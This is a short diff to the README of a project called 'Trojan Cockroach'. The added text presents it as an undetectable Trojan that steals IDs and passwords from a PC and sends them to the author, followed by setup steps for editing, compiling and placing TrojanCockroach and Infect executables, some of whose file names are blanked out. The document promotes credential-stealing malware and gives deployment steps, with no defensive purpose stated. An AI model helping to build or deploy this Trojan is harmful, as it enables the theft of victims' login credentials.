@@ -1,4 +1,7 @@
 # Trojan Cockroach
+This program is an undetectable **Trojan Virus** that steals data (ID, password) from PC and sends it to the author.
+
+# Setup
 1. Change **--and--()** method of **TrojanCockroach.cpp** according to your wish.
 2. Compile **TrojanCockroach.cpp** & **Infect.cpp** (do not rename them).
 3. Place **TrojanCockroach.exe**, **Infect.exe**, **------**, **------** & **------** in the same folder.
